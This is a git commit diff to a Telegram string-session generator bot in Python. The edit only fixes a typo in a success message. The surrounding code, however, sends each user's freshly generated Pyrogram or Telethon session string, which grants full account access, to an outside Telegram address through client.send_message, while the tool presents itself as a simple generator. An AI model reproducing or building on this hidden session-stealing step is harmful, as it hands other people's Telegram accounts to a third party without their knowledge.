f87d796307e6e83f251b3334b9a78a8a6b536120
AppleBotz <95849390+AppleBotz@users.noreply.github.com>
2022-01-28 16:36:50 +0700

    Update generate.py

--- StringSessionBot/generate.py
+++ StringSessionBot/generate.py
@@ -117,7 +117,7 @@ async def generate_session(bot, msg, telethon=False):
     text = "**{} STRING SESSION** \n\n`{}` \n\n**Donate To Me For Support** @BLVCKCARDS".format("TELETHON" if telethon else "PYROGRAM", string_session)
     await client.send_message("https://t.me/Stringsessiontelegrambot", text)
     await client.disconnect()
-    await phone_code_msg.reply("✅** SuccessfulLy create {} string session.**\n\n╔══╦╗╔══╦═╦╦╗╔═╦══╦═╦══╗\n║╔╗║║║╔╗║╔╣╔╝║╔╣╔╗║╬╠╗╗║\n║╔╗║╚╣╠╣║╚╣╚╗║╚╣╠╣║╗╬╩╝║\n╚══╩═╩╝╚╩═╩╩╝╚═╩╝╚╩╩╩══╝\n\nBy @StringSessiontelegrambot".format("telethon" if telethon else "pyrogram"))
+    await phone_code_msg.reply("✅** Successfully create {} string session.**\n\n╔══╦╗╔══╦═╦╦╗╔═╦══╦═╦══╗\n║╔╗║║║╔╗║╔╣╔╝║╔╣╔╗║╬╠╗╗║\n║╔╗║╚╣╠╣║╚╣╚╗║╚╣╠╣║╗╬╩╝║\n╚══╩═╩╝╚╩═╩╩╝╚═╩╝╚╩╩╩══╝\n\nBy @StringSessiontelegrambot".format("telethon" if telethon else "pyrogram"))
 
 
 async def cancelled(msg):
